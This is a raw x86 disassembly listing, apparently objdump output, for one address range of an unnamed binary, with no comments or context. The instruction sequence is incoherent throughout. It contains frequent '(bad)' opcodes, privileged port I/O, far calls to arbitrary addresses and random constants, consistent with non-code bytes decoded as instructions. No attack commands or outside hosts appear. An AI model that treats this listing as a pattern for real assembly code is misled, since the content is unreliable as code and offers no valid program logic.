  4221ed:	mov    cl,0xf0
  4221ef:	int3   
  4221f0:	inc    esp
  4221f1:	xchg   edi,eax
  4221f2:	xchg   ebp,eax
  4221f3:	pop    ecx
  4221f4:	outs   dx,WORD PTR ds:[esi]
  4221f6:	pop    ebx
  4221f7:	push   es
  4221f8:	pop    es
  4221f9:	sub    BYTE PTR [edi-0x53],bh
  4221fc:	pcmpgtd mm2,QWORD PTR [ecx+0x7a]
  422200:	dec    eax
  422201:	mov    ebx,0x16a80f1f
  422206:	enter  0x922d,0xa6
  42220a:	sti    
  42220b:	pop    ecx
  42220c:	(bad)  
  42220d:	xchg   ecx,eax
  42220e:	sub    DWORD PTR [edx-0x1db2a561],edx
  422214:	cmp    ch,BYTE PTR [ecx+0x20dfaecf]
  42221a:	pop    ecx
  42221b:	fiadd  WORD PTR [eax+0x76]
  42221e:	and    dl,bl
  422220:	push   edi
  422221:	mov    BYTE PTR [ecx],bl
  422223:	pop    esp
  422224:	push   ds
  422225:	fs dec edx
  422227:	jmp    0xcec8697a
  42222c:	imul   edx,DWORD PTR [eax+0x783b3206],0x50
  422233:	xchg   edx,eax
  422234:	add    eax,0xea8a956c
  422239:	out    0x95,eax
  42223b:	push   esp
  42223c:	ss scas eax,DWORD PTR es:[edi]
  42223e:	in     al,dx
  42223f:	push   ebp
  422240:	add    ch,ah
  422242:	or     al,0x5d
  422244:	cs leave 
  422246:	jmp    0x42225c
  422248:	push   edi
  422249:	mov    dh,0x7d
  42224b:	out    0x20,al
  42224d:	mov    ah,0x45
  42224f:	loope  0x422241
  422251:	shl    BYTE PTR [eax],0x7d
  422254:	pop    es
  422255:	pop    ds
  422256:	or     al,cl
  422258:	ins    BYTE PTR es:[edi],dx
  422259:	outs   dx,BYTE PTR ds:[esi]
  42225a:	or     al,0xa9
  42225c:	je     0x422299
  42225e:	inc    ebx
  42225f:	pop    ecx
  422260:	mov    edi,0xf555c53f
  422265:	les    ebx,FWORD PTR [eax]
  422267:	das    
  422268:	nop
  422269:	mov    ?,WORD PTR [ecx-0xc0ede63]
  42226f:	or     edi,ebp
  422271:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422272:	arpl   WORD PTR [eax],cx
  422274:	inc    edx
  422275:	sub    al,0xdc
  422277:	jmp    FWORD PTR [edi-0x3e]
  42227a:	gs xor edx,ecx
  42227d:	jp     0x4222aa
  42227f:	daa    
  422280:	das    
  422281:	xchg   BYTE PTR [edi+ebp*4+0x19],dl
  422285:	xlat   BYTE PTR ds:[ebx]
  422286:	pop    ds
  422287:	sub    BYTE PTR [ebx+0x6f7f0e06],bh
  42228d:	das    
  42228e:	cwde   
  42228f:	loope  0x4222c5
  422291:	jns    0x422274
  422293:	jmp    0x155:0x3c5f45fd
  42229a:	(bad)  
  42229b:	mov    al,0x2e
  42229d:	jle    0x42223f
  42229f:	subps  xmm4,xmm3
  4222a2:	sbb    DWORD PTR [ebx],edi
  4222a4:	icebp  
  4222a5:	sub    eax,0x5262fb39
  4222aa:	jbe    0x4222d1
  4222ac:	pop    ecx
  4222ad:	fist   DWORD PTR [ebx]
  4222af:	test   al,0x5c
  4222b1:	call   0x7b282171
  4222b6:	adc    edi,DWORD PTR [ebx+0x35]
  4222b9:	jle    0x4222f8
  4222bb:	cmp    eax,0xd627885a
  4222c0:	or     DWORD PTR [ebx-0x35],edx
  4222c3:	pop    eax
  4222c4:	lea    ebx,[ebx]
  4222c6:	xchg   DWORD PTR [esi],ecx
  4222c8:	das    
  4222c9:	sar    BYTE PTR [eax-0x3e],1
  4222cc:	out    0x12,al
  4222ce:	test   DWORD PTR [edi],ebp
  4222d0:	popf   
  4222d1:	adc    bl,BYTE PTR [ebp+0xa]
  4222d4:	rcr    DWORD PTR [ebp+0x64],0xb9
  4222d8:	mov    al,0xc6
  4222da:	nop
  4222db:	int3   
  4222dc:	mov    bh,0xd9
  4222de:	push   0x343e65c5
  4222e3:	push   0xf271c5e
  4222e8:	adc    al,bl
  4222ea:	out    dx,eax
  4222eb:	sbb    esp,DWORD PTR [ebp-0x42]
  4222ee:	es jnp 0x4222a9
  4222f1:	dec    esp
  4222f2:	stc    
  4222f3:	cld    
  4222f4:	inc    esp
  4222f5:	add    eax,0x8e37aafd
  4222fa:	fidivr DWORD PTR [ebp-0x7e]
  4222fd:	sbb    ebp,DWORD PTR [ecx+ebx*8]
  422300:	and    DWORD PTR [esp+eax*1],edx
  422303:	mov    esp,0x7ed9ed71
  422308:	cmp    DWORD PTR [eax],esp
  42230a:	(bad)  
  42230b:	call   0xf373:0xf00bf01b
  422312:	add    eax,0x1eac8470
  422317:	xor    ch,bl
  422319:	leave  
  42231a:	(bad)  
  42231c:	mov    bl,0xc0
  42231e:	ds xchg edx,eax
  422320:	aam    0xfd
  422322:	mov    BYTE PTR [edi+0x37],ch
  422325:	push   cs
  422326:	(bad)  
  422327:	and    eax,0x60fef398
  42232c:	or     ah,BYTE PTR [edx+0x79f2519e]
  422332:	mov    ebp,0x91afc788
  422337:	(bad)  
  422338:	fwait
  422339:	into   
  42233a:	push   ebx
  42233b:	daa    
  42233c:	adc    BYTE PTR [edi+0x72],ah
  42233f:	push   ecx
  422340:	cwde   
  422341:	and    dl,BYTE PTR [edx-0x7eb6c84f]
  422347:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422348:	js     0x4222ea
  42234a:	lds    ebx,FWORD PTR [eax]
  42234c:	test   al,0x9
  42234e:	popf   
  42234f:	in     al,dx
  422350:	mov    ch,0x39
  422352:	aam    0x6d
  422354:	loopne 0x422326
  422356:	dec    ebx
  422357:	and    BYTE PTR [ebx+0x12],al
  42235a:	sbb    esp,DWORD PTR [esi+0x7611c6fd]
  422360:	imul   ecx,DWORD PTR [ebx],0x2
  422363:	ss push ebx
  422365:	ja     0x42235d
  422367:	ret    0x42eb
  42236a:	add    al,0xc6
  42236c:	sbb    ch,BYTE PTR [edi+0x3455fde5]
  422372:	jne    0x42239d
  422374:	loope  0x4223d2
  422376:	xor    BYTE PTR [ebp+0xd],bl
  422379:	mov    bl,0x4a
  42237b:	push   ebp
  42237c:	inc    ebx
  42237d:	aas    
  42237e:	fwait
  42237f:	es mov edx,0xfe09030e
  422385:	adc    eax,0xc9e21393
  42238a:	retf   
  42238b:	jmp    DWORD PTR ds:0xceac90ee
  422391:	out    dx,al
  422392:	loop   0x422330
  422394:	mov    edx,0x3125084c
  422399:	jecxz  0x422348
  42239b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42239c:	jns    0x4223fb
  42239e:	inc    esp
  42239f:	hlt    
  4223a0:	or     dh,cl
  4223a2:	mov    ss,WORD PTR [edx+edx*8+0x5b]
  4223a6:	out    dx,eax
  4223a7:	jmp    FWORD PTR [edi+ebp*2]
  4223aa:	sub    BYTE PTR [eax-0x8],bh
  4223ad:	das    
  4223ae:	call   0xe69b:0xd5c71149
  4223b5:	dec    edi
  4223b6:	inc    ebx
  4223b7:	data16 jp 0x4223aa
  4223ba:	xchg   esi,eax
  4223bb:	sbb    eax,0xffffffb7
  4223be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223bf:	jl     0x42234d
  4223c1:	push   0x62
  4223c3:	lsl    ebx,WORD PTR [eax]
  4223c6:	gs adc ah,bh
  4223c9:	repz xor bl,BYTE PTR [edi-0x6]
  4223cd:	fbld   TBYTE PTR [ebp+0x1597ecd]
  4223d3:	pop    ds
  4223d4:	dec    DWORD PTR [edi+0x2f]
  4223d7:	(bad)  
  4223d9:	and    al,0x66
  4223db:	cmp    esp,eax
  4223dd:	lock sbb DWORD PTR fs:[edi-0x58c2256b],esi
  4223e5:	xchg   edi,eax
  4223e6:	cmp    bl,ah
  4223e8:	aas    
  4223e9:	pushf  
  4223ea:	add    esp,DWORD PTR [ebp+0xf]
  4223ed:	shl    DWORD PTR [edx-0x1fc2391f],0x40
  4223f4:	lock shl ecx,1
  4223f7:	jp     0x4223f7
  4223f9:	not    BYTE PTR [ebx+0x9]
  4223fc:	jge    0x422413
  4223fe:	inc    ecx
  4223ff:	shr    DWORD PTR [esi-0x4edebf06],cl
  422405:	mov    bh,0xa5
  422407:	scas   al,BYTE PTR es:[edi]
  422408:	sbb    edi,esi
  42240a:	cmp    edx,ebp
  42240c:	ds mov ch,0xd0
  42240f:	push   esp
  422410:	jmp    0xf96dbf36
  422415:	fldcw  WORD PTR [esp+eax*1]
  422418:	in     eax,dx
  422419:	cmp    eax,eax
  42241b:	mov    cl,BYTE PTR [edi-0x4675b155]
  422421:	pop    ebx
  422422:	pop    es
  422423:	stos   BYTE PTR es:[edi],al
  422424:	retf   0x275d
  422427:	mov    bh,0xc0
  422429:	popa   
  42242a:	push   esi
  42242b:	push   ds
  42242c:	inc    ebp
  42242d:	pop    es
  42242e:	mov    ds:0x7bcc9a4b,al
  422433:	dec    esi
  422434:	xchg   ebx,eax
  422435:	mov    ebx,0xbd6ed047
  42243a:	mov    ds:0x65aa272,al
  42243f:	adc    BYTE PTR [edi+0x5f],dl
  422442:	mov    bl,0xf0
  422444:	ror    BYTE PTR [esi-0x62e35259],cl
  42244a:	ret    
  42244b:	adc    BYTE PTR [ecx-0x6e],ah
  42244e:	mov    ebx,DWORD PTR [eax]
  422450:	rcl    BYTE PTR [edi-0x6e845008],cl
  422456:	addr16 mov bl,0x73
  422459:	fs sti 
  42245b:	je     0x422451
  42245d:	ja     0x422421
  42245f:	and    eax,0x65c8b1c1
  422464:	call   0xc5d7:0xf78e7566
  42246b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42246c:	mov    eax,ds:0x1cf58064
  422471:	call   0xf8c9:0xa3034da9
  422478:	in     al,0x7a
  42247a:	les    ebx,FWORD PTR [ebx+0x3b1773dc]
  422480:	xchg   DWORD PTR [edi-0x124429a1],edx
  422486:	(bad)  
  422487:	push   edx
  422488:	pushf  
  422489:	rcr    al,1
  42248b:	rol    ecx,1
  42248d:	fld    DWORD PTR [ebx-0x77]
  422490:	add    eax,0x4eef55b3
  422495:	jle    0x42243f
  422497:	cmp    DWORD PTR [eax-0x590c0336],edx
  42249d:	add    edx,eax
  42249f:	cmp    bh,BYTE PTR [esi-0x31]
  4224a2:	ja     0x42248e
  4224a4:	mov    ds:0x5ae476c4,eax
  4224a9:	or     al,0x92
  4224ab:	push   esp
  4224ac:	sub    al,BYTE PTR [edx+0x73]
  4224af:	out    0xa2,eax
  4224b1:	inc    esi
  4224b2:	pop    edx
  4224b3:	dec    eax
  4224b4:	fidiv  WORD PTR [esi+0x3ff34a5a]
  4224ba:	jbe    0x84b20b82
  4224c0:	pop    ebp
  4224c1:	lock ss clc 
  4224c4:	in     al,0xae
  4224c6:	aad    0x4f
  4224c8:	sbb    DWORD PTR [eax+ecx*8],edx
  4224cb:	fiadd  WORD PTR [edx+eiz*1-0x49]
  4224cf:	mov    cs,WORD PTR [ebp-0x11df01f6]
  4224d5:	cmp    al,0x3c
  4224d7:	outs   dx,BYTE PTR ds:[esi]
  4224d8:	mov    ah,0xe9
  4224da:	adc    eax,0x49dc7539
  4224df:	jnp    0x422499
  4224e1:	lds    ecx,FWORD PTR [eax]
  4224e3:	lock dec esi
  4224e5:	dec    ebx
  4224e6:	xor    BYTE PTR [edx],cl
  4224e8:	sahf   
  4224e9:	xlat   BYTE PTR ds:[ebx]
  4224ea:	outs   dx,BYTE PTR ds:[esi]
  4224eb:	leave  
  4224ec:	sub    bh,BYTE PTR ds:0xff601c59
  4224f2:	mov    ds:0x771308ee,al
  4224f7:	ret    0xafb
  4224fa:	retf   0x4172
  4224fd:	rcl    DWORD PTR [edi],cl
  4224ff:	dec    edi
  422500:	push   0x52
  422502:	into   
  422503:	rcr    dh,1
  422505:	dec    esi
  422506:	repz inc ebp
  422508:	ss xchg ebx,eax
  42250a:	push   0x9b9903d5
  42250f:	cmp    eax,DWORD PTR [edx-0x7f957a38]
  422515:	cmc    
  422516:	loopne 0x4224f4
  422518:	lods   eax,DWORD PTR ds:[esi]
  422519:	shl    BYTE PTR [eax+0x54d8f7f5],cl
  42251f:	enter  0x7cd7,0x62
  422523:	test   eax,0xaf457318
  422528:	mov    WORD PTR [ebx+0x8],ss
  42252b:	jns    0x4224bd
  42252d:	clc    
  42252e:	arpl   WORD PTR ss:[esi+0x4f4957e3],di
  422535:	add    DWORD PTR [edi+0x6],esp
  422538:	pushf  
  422539:	imul   ebp,DWORD PTR ss:[esi+0x2],0xd5218852
  422541:	push   edx
  422542:	or     ah,bl
  422544:	xor    al,0xc5
  422546:	push   0xe4ee600c
  42254b:	in     al,dx
  42254c:	js     0x422508
  42254e:	inc    ecx
  42254f:	scas   al,BYTE PTR es:[edi]
  422550:	idiv   DWORD PTR [eax]
  422552:	es jl  0x422558
  422555:	cld    
  422556:	jmp    0x4224f6
  422558:	call   0x32e1959b
  42255d:	mov    ebp,0xb3ddd2c8
  422562:	jbe    0x422509
  422564:	pop    ds
  422565:	es jl  0x422571
  422568:	mov    edi,0x27611e1e
  42256d:	pop    es
  42256e:	mov    esp,DWORD PTR [ebx+eax*8+0x4c62c0a4]
  422575:	jno    0x4225bc
  422577:	stc    
  422578:	test   al,0x68
  42257a:	push   ds
  42257b:	mov    ?,edx
  42257d:	jno    0x4225eb
  42257f:	push   ds
  422580:	cmp    eax,0x78275816
  422585:	adc    eax,0xa85d070d
  42258a:	popa   
  42258b:	imul   ecx,DWORD PTR [edi],0xa5e11dee
  422591:	inc    esi
  422592:	cmp    ebx,DWORD PTR [edx+0x4c4aa529]
  422598:	dec    eax
  422599:	mov    ebp,0x1c416bea
  42259e:	outs   dx,BYTE PTR ds:[esi]
  42259f:	out    0xc3,al
  4225a1:	outs   dx,BYTE PTR ds:[esi]
  4225a2:	lahf   
  4225a3:	push   ss
  4225a4:	in     eax,0x15
  4225a6:	shr    BYTE PTR [edx-0x7cda5b55],0x28
  4225ad:	aas    
  4225ae:	add    esi,DWORD PTR [edx-0x40e95c85]
  4225b4:	test   ah,bl
  4225b6:	dec    ebx
  4225b7:	jne    0x4225d8
  4225b9:	neg    DWORD PTR [eax-0x72]
  4225bc:	mov    fs,esp
  4225be:	inc    eax
  4225bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225c0:	fsubr  QWORD PTR [edi]
  4225c2:	leave  
  4225c3:	retf   0x588a
  4225c6:	push   ecx
  4225c7:	pop    ebx
  4225c8:	jae    0x4225c6
  4225ca:	fnstenv [ebx-0x3d]
  4225cd:	fwait
  4225ce:	cmp    eax,0x9154cb7c
  4225d3:	inc    edi
  4225d4:	cli    
  4225d5:	call   0x248e:0xab1f33a6
  4225dc:	push   edi
  4225dd:	stc    
  4225de:	(bad)  
  4225e0:	mov    ds,WORD PTR [ebp-0x3d]
  4225e3:	mov    DWORD PTR [edi+0x102f0c80],eax
  4225e9:	sbb    dh,BYTE PTR [edx+eax*8+0x52b0f602]
  4225f0:	int    0x53
  4225f2:	mov    eax,0x92e76a39
  4225f7:	aas    
  4225f8:	push   esp
  4225f9:	pop    edi
  4225fa:	or     BYTE PTR [ebx-0x4a8f3888],0x5d
  422601:	sub    BYTE PTR [ebx+0x6],bh
  422604:	nop
  422605:	mov    dl,0xba
  422607:	cmp    ecx,DWORD PTR [ecx+esi*2-0x757fe25b]
  42260e:	jle    0x422683
  422610:	sbb    BYTE PTR [ebx-0x37],bl
  422613:	xchg   esp,eax
  422614:	lods   al,BYTE PTR ds:[esi]
  422615:	jb     0x422670
  422617:	push   eax
  422618:	cld    
  422619:	jmp    0xd0547a1b
  42261e:	dec    DWORD PTR [edx]
  422620:	mov    ss,WORD PTR [ebx+0x17]
  422623:	jae    0x4225aa
  422625:	(bad)  
  422626:	mov    cl,0x87
  422628:	stos   BYTE PTR es:[edi],al
  422629:	mov    ebx,DWORD PTR [ebp-0x781bf688]
  42262f:	jb     0x422609
  422631:	loope  0x422611
  422633:	mov    esi,0x654455cb
  422638:	imul   edx,DWORD PTR [ebp+0x1d],0x4
  42263c:	lods   al,BYTE PTR ds:[esi]
  42263d:	mov    ebx,0xf554fc57
  422642:	stos   BYTE PTR es:[edi],al
  422643:	pop    es
  422644:	xor    eax,esi
  422646:	clc    
  422647:	xlat   BYTE PTR ds:[ebx]
  422648:	jb     0x422600
  42264a:	fdivr  QWORD PTR [eax+0xa]
  42264d:	pop    eax
  42264e:	xchg   BYTE PTR ds:0xd3d26579,cl
  422654:	fadd   QWORD PTR [eax+0x7eac9c00]
  42265a:	push   esi
  42265b:	mov    al,ds:0xd15d8c7b
  422660:	or     eax,0xafb9eb89
  422665:	nop
  422666:	pop    edx
  422667:	(bad)
  42266c:	lds    ebp,FWORD PTR [esp+ebp*4+0xf]
  422670:	jnp    0x4226df
  422672:	or     dh,ah
  422674:	mov    dl,0xdc
  422676:	fnsave [ebp+eax*8+0x2ffcdfab]
  42267d:	dec    esp
  42267e:	retf   
  42267f:	(bad)  
  422680:	aad    0x2a
  422682:	arpl   bp,di
  422684:	inc    esp
  422685:	jp     0x422670
  422687:	iret   
  422688:	(bad)  
  422689:	clc    
  42268a:	jne    0x422644
  42268c:	outs   dx,DWORD PTR ds:[esi]
  42268d:	test   DWORD PTR [eax],ecx
  42268f:	aaa    
  422690:	rcl    DWORD PTR [eax],0x44
  422693:	push   ds
  422694:	and    ah,BYTE PTR [esi]
  422696:	push   0xffffffe9
  422698:	or     al,0xd8
  42269a:	pop    ebp
  42269b:	mov    bh,0xf2
  42269d:	sbb    DWORD PTR [bp+0x4b],0x52585441
  4226a5:	shl    ch,cl
  4226a7:	adc    bh,BYTE PTR [ebx+0x3e]
  4226aa:	adc    al,0x15
  4226ac:	in     al,0x17
  4226ae:	push   0xdf0599ba
  4226b3:	mov    cl,0x1b
  4226b5:	iret   
  4226b6:	fld    QWORD PTR [ebp-0x6dd08d66]
  4226bc:	pusha  
  4226bd:	xor    bh,0xf5
  4226c0:	outs   dx,DWORD PTR ds:[esi]
  4226c1:	fs inc ebp
  4226c3:	or     eax,edi
  4226c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4226c6:	aam    0xc9
  4226c8:	xor    esp,DWORD PTR [ebx]
  4226ca:	(bad)  
  4226cb:	jle    0x4226e0
  4226cd:	pushf  
  4226ce:	dec    edi
  4226cf:	rcl    ebx,1
  4226d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226d2:	in     al,dx
  4226d3:	pop    es
  4226d4:	js     0x42273a
  4226d6:	push   edx
  4226d7:	jecxz  0x422666
  4226d9:	daa    
  4226da:	add    eax,DWORD PTR [edx-0x69]
  4226dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4226de:	ret    
  4226df:	ror    eax,cl
  4226e1:	and    BYTE PTR [eax+0x47f01d77],0xd1
  4226e8:	sbb    al,0x1b
  4226ea:	cmc    
  4226eb:	and    al,0xea
  4226ed:	push   ebp
  4226ee:	loopne 0x4226b0
  4226f0:	cmp    al,0xc2
  4226f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226f3:	(bad)
  4226f6:	imul   ebx,esp,0x2e1a4506
  4226fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4226fe:	xor    ecx,ebp
  422700:	nop
  422701:	out    0x3c,eax
  422703:	stos   BYTE PTR es:[edi],al
  422704:	mov    ebp,gs
  422706:	mov    esp,DWORD PTR [esi]
  422708:	into   
  422709:	lods   al,BYTE PTR ds:[esi]
  42270a:	push   eax
  42270b:	fimul  DWORD PTR [eax+0x3]
  42270e:	es retf 0x766a
  422712:	sti    
  422713:	or     ebx,edi
  422715:	lds    esp,FWORD PTR [ecx+0x26d3458c]
  42271b:	je     0x4226ce
  42271d:	aaa    
  42271e:	fisttp QWORD PTR [ebx+eax*4-0x4d]
  422722:	jno    0x42276c
  422724:	dec    ebp
  422725:	jp     0x42274f
  422727:	jmp    0x422751
  422729:	int3   
  42272a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42272b:	test   BYTE PTR [ecx-0x13],0x21
  42272f:	cli    
  422730:	mov    ah,0x42
  422732:	stos   DWORD PTR es:[edi],eax
  422733:	dec    edx
  422734:	(bad)  
  422735:	and    al,0xa6
  422737:	retf   0x51ff
  42273a:	and    ebx,DWORD PTR [eax+0x2cbffbda]
  422740:	mov    dl,BYTE PTR [esi+ecx*4-0x438d81b6]
  422747:	xchg   BYTE PTR [ebp+0x20],bh
  42274a:	cdq    
  42274b:	cli    
  42274c:	jae    0x422795
  42274e:	test   al,0x6e
  422750:	mov    es,WORD PTR [edi-0x70]
  422753:	rcl    DWORD PTR [ecx-0x3eab025a],1
  422759:	stos   BYTE PTR es:[edi],al
  42275a:	jmp    0x8a05eb30
  42275f:	jge    0x422767
  422761:	push   eax
  422762:	mov    ds:0x98c57803,eax
  422767:	cmp    cl,BYTE PTR [eax+0x8]
  42276a:	scas   eax,DWORD PTR es:[edi]
  42276b:	in     al,dx
  42276c:	dec    esi
  42276d:	mov    cl,0x95
  42276f:	xor    al,0xa3
  422771:	jl     0x42272c
  422773:	sbb    ebp,ebx
  422775:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422776:	mov    ecx,0x72c1a852
  42277b:	sbb    ebp,DWORD PTR [eax]
  42277d:	ds (bad) 
  42277f:	imul   DWORD PTR [ebx+0x40]
  422782:	and    BYTE PTR [ebx-0x58938b1],bh
  422788:	imul   esi,DWORD PTR [ebp-0x4aa92c0a],0x72
  42278f:	mov    ds:0x4d55c27e,al
  422794:	push   ds
  422795:	cdq    
  422796:	or     DWORD PTR [edi],esi
  422798:	imul   esp,DWORD PTR [ebx-0x6a3342cf],0x50747026
  4227a2:	or     BYTE PTR [ecx-0x10],0xf3
  4227a6:	mov    edx,0x97301c14
  4227ab:	outs   dx,BYTE PTR ds:[esi]
  4227ac:	dec    edi
  4227ad:	and    bl,BYTE PTR [edx-0x50486a0f]
  4227b3:	push   eax
  4227b4:	call   0x42dc5ec7
  4227b9:	aaa    
  4227ba:	push   es
  4227bb:	in     eax,0x32
  4227bd:	outs   dx,DWORD PTR ds:[esi]
  4227be:	arpl   WORD PTR [edi-0x55e5136],si
  4227c4:	repnz loopne 0x4227fd
  4227c7:	jmp    0x422804
  4227c9:	adc    al,0x25
  4227cb:	pop    esp
  4227cc:	cli    
  4227cd:	clc    
  4227ce:	addr16 xchg esi,eax
  4227d0:	sbb    al,0xe0
  4227d2:	pop    eax
  4227d3:	sub    BYTE PTR [edi-0x41],dh
  4227d6:	adc    al,BYTE PTR [ebp+0x3d]
  4227d9:	cmp    ecx,DWORD PTR [ecx+0x39]
  4227dc:	shl    DWORD PTR [ebx-0xc],cl
  4227df:	and    al,0x57
  4227e1:	retf   
  4227e2:	(bad)  
  4227e4:	xor    eax,0x446a1ac0
  4227e9:	inc    edx
  4227ea:	imul   ebp,DWORD PTR [eax-0x7bbf4c7a],0x5c1a603
  4227f4:	leave  
  4227f5:	test   BYTE PTR [esi],0x5c
  4227f8:	mov    esp,0xbe0d3383
  4227fd:	lea    ecx,[ebp+0x4c]
  422800:	push   0xffffffe3
  422802:	pushf  
  422803:	sbb    DWORD PTR [ebp-0x7ecb61ca],0x1e
  42280a:	xchg   ebp,eax
  42280b:	sar    BYTE PTR [edi],0x4c
  42280e:	mov    al,0xda
  422810:	std    
  422811:	jb     0x4227d0
  422813:	mov    ds:0xa1f2449f,al
  422818:	sbb    BYTE PTR [ecx-0x33],al
  42281b:	xor    eax,0x7c9c264e
  422820:	(bad)  
  422821:	dec    eax
  422822:	and    BYTE PTR [edx+0x47],dl
  422825:	xor    DWORD PTR [esi],ebp
  422827:	aad    0x17
  422829:	fimul  WORD PTR [esi-0x56]
  42282c:	xor    esi,DWORD PTR [ecx-0x4102b2e8]
  422832:	or     eax,0x704ef17c
  422837:	inc    eax
  422838:	add    BYTE PTR [edi+0x24],bl
  42283b:	pop    edx
  42283c:	sub    eax,0x9a3fd926
  422841:	pop    eax
  422842:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422843:	mov    edx,0x835738b6
  422848:	jle    0x42285f
  42284a:	(bad)  
  42284b:	mul    DWORD PTR [ebx+eax*1+0x1876b769]
  422852:	sbb    al,0x6f
  422854:	pusha  
  422855:	inc    esp
  422856:	jecxz  0x42280c
  422858:	push   ds
  422859:	fistp  QWORD PTR [eax-0x37]
  42285c:	jne    0x42283a
  42285e:	adc    al,0x9e
  422860:	aad    0xea
  422862:	iret   
  422863:	push   es
  422864:	mov    bl,0x5
  422866:	add    DWORD PTR [eax-0x169d6cb8],esi
  42286c:	jecxz  0x422828
  42286e:	mov    DWORD PTR [esi],edx
  422870:	or     al,0xc9
  422872:	dec    ebp
  422873:	inc    esp
  422874:	xchg   esi,eax
  422875:	pop    ebx
  422876:	rol    bl,1
  422878:	(bad)  
  422879:	das    
  42287a:	outs   dx,BYTE PTR ds:[esi]
  42287b:	mov    ds:0x1a532d98,eax
  422880:	mov    al,ds:0xb56ab35e
  422885:	es add cl,0xc8
  422889:	sub    eax,DWORD PTR [edx+0x62bb2109]
  42288f:	sub    al,0x78
  422891:	aaa    
  422892:	push   ecx
  422893:	div    DWORD PTR [edx]
  422895:	pop    esp
  422896:	mov    dh,bl
  422898:	fscale 
  42289a:	pop    ebp
  42289b:	mov    ecx,0x6a1dc96
  4228a0:	out    0xf5,al
  4228a2:	pop    edx
  4228a3:	test   al,0xd7
  4228a5:	pop    edi
  4228a6:	push   ss
  4228a7:	out    dx,al
  4228a8:	(bad)  
  4228a9:	int3   
  4228aa:	mov    BYTE PTR [ebp+esi*1-0x52],ah
  4228ae:	mov    al,ds:0xcaff4854
  4228b3:	aam    0xed
  4228b5:	mov    al,ds:0x2c838408
  4228ba:	jg     0x4228ad
  4228bc:	pop    esp
  4228bd:	or     ecx,edi
  4228bf:	pop    edx
  4228c0:	cmc    
  4228c1:	xchg   esi,eax
  4228c2:	pop    esi
  4228c3:	aam    0x2a
  4228c5:	mov    BYTE PTR [ebx],al
  4228c7:	jns    0x42287f
  4228c9:	cld    
  4228ca:	mov    cl,bh
  4228cc:	mov    ebp,0x599c1086
  4228d1:	add    eax,0xd5ed95b1
  4228d6:	jne    0x422932
  4228d8:	mov    BYTE PTR [edx-0x159b7dae],dh
  4228de:	shl    BYTE PTR [esi-0x65],cl
  4228e1:	inc    ebx
  4228e2:	ins    DWORD PTR es:[edi],dx
  4228e3:	mov    cl,0xd0
  4228e5:	sbb    al,0xfb
  4228e7:	and    al,0xa1
  4228e9:	cmp    cl,BYTE PTR [ecx]
  4228eb:	rcl    BYTE PTR [ecx-0x7b],1
  4228ee:	sar    DWORD PTR [esi-0x4d],0x4e
  4228f2:	call   0xfac2:0x4680f601
  4228f9:	sub    eax,0xb7b3fc21
  4228fe:	mov    al,ds:0x5e94d816
  422903:	add    dl,bh
  422905:	pusha  
  422906:	out    dx,eax
  422907:	sub    BYTE PTR [esp+ecx*1-0x45626dfe],al
  42290e:	test   bh,bl
  422910:	or     DWORD PTR [eax+0x6c],0x155aa267
  422917:	mov    eax,0x28d6cbbe
  42291c:	(bad)  
  42291d:	out    dx,eax
  42291e:	pop    ebx
  42291f:	shl    BYTE PTR [ecx+0x44e16e60],0x96
  422926:	sbb    ebx,0xfffffffe
  422929:	fs add eax,esp
  42292c:	inc    ebp
  42292d:	fst    st(2)
  42292f:	and    BYTE PTR [eax],bh
  422931:	iret   
  422932:	ds sub ebx,esp
  422935:	bound  esi,QWORD PTR [ebx+0x543ee507]
  42293b:	dec    ebx
  42293c:	mov    bl,0x94
  42293e:	and    eax,0xdf308c19
  422943:	and    bl,0xa8
  422946:	adc    edx,edx
  422948:	inc    ebx
  422949:	push   es
  42294a:	lock fidiv DWORD PTR [esp+eiz*8]
  42294e:	cmp    BYTE PTR [edx],0xc8
  422951:	or     bl,dh
  422953:	push   0xffffffdd
  422955:	or     dh,BYTE PTR [esi]
  422957:	xor    DWORD PTR [edi+esi*4-0x1a4b5ccf],edi
  42295e:	jl     0x42292f
  422960:	ins    BYTE PTR es:[edi],dx
  422961:	jns    0x42298a
  422963:	mov    ebx,0x418e0976
  422968:	add    ebx,edx
  42296a:	xchg   esi,eax
  42296b:	pop    ds
  42296c:	sbb    dl,BYTE PTR [ebx]
  42296e:	repz and al,0x7e
  422971:	sti    
  422972:	out    dx,al
  422973:	jo     0x4229e6
  422975:	imul   ecx,DWORD PTR [ecx-0x7a90f540],0x67c91c8b
  42297f:	xchg   ebp,eax
  422980:	push   esp
  422981:	rcl    DWORD PTR [ebx+0x36cf03fb],0xf1
  422988:	push   ds
  422989:	mov    edx,0xc1a27e09
  42298e:	push   cs
  42298f:	jne    0x4229a6
  422991:	imul   esi,DWORD PTR [eax-0x2965bc25],0x8
  422998:	mov    ch,0xe8
  42299a:	adc    BYTE PTR [ebp-0xc],bl
  42299d:	ins    DWORD PTR es:[edi],dx
  42299e:	fbstp  TBYTE PTR [edx]
  4229a0:	enter  0x4515,0x3d
  4229a4:	pop    edi
  4229a5:	xor    DWORD PTR [ecx],ebp
  4229a7:	xchg   edx,eax
  4229a8:	sub    al,0xa9
  4229aa:	popf   
  4229ab:	std    
  4229ac:	adc    eax,0xfa806b57
  4229b1:	leave  
  4229b2:	xor    edx,DWORD PTR [ecx-0x331fdbba]
  4229b8:	repnz inc ecx
  4229ba:	jae    0x42297c
  4229bc:	stos   BYTE PTR es:[edi],al
  4229bd:	inc    sp
  4229bf:	and    BYTE PTR [ecx],bl
  4229c1:	mov    ecx,DWORD PTR [edi-0x3fb536ef]
  4229c7:	into   
  4229c8:	iret   
  4229c9:	daa    
  4229ca:	jmp    0x422a2e
